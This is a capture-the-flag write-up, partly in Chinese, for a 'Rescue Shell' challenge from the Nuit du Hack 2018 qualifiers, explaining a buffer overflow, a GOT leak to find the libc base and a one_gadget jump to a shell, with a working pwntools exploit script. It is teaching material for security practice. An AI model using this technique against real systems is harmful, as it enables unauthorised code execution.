# Nuit du Hack CTF Quals 2018 - Notes

## BaseX
> Description:
>
> BaseX stores datas from stdin into a buffer.

## Rescue Shell
> Description:
>
> RescueShell gives shell access to admins for debugging purposes. Temporarily disabled due to security issues.

可以看到他的保護只有開 DEP ，然後 check_passphrase() 中有很明顯的 buffer overflow

所以整個解體流程是:
1. overflow 控制 rip
2. leak got 來算 base
3. one_gadget 

那 leak 可以使用 main 中的 strlen 那

先跳到那邊讓他把 rax 設為 8 ，之後下面就是 write(1, rbp-0x150, rax)

所以在一開始要 overflow 時，要先把 rbp 設好，這邊假設要 leak fclose@got

那在一開始 overflow 時，就先將 rbp 設為 fclose@got + 0x150

這樣完成後就可以算出 libc ，之後再 overflow 一次後跳 one_gadget_rce
```
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = remote('127.0.0.1', 1234)

r.recvuntil(": ")
# raw_input("#")
trash = 'a'*64
pop_rdi = 0x0000000000400a93
string_eight = 0x400abc
strlen_call = 0x004009ca
fclose_got = 0x0000000601220
fclose_off = 0x0006e3f0
one_gadget_off = 0x45526

pad = flat([ fclose_got+0x150 , pop_rdi, string_eight, strlen_call ])
r.sendline(trash + pad)
base = u64(r.recv(8)) - fclose_off
print "base: ",hex(base)

r.send("a"*72 + p64(base+one_gadget_off))
r.interactive()
```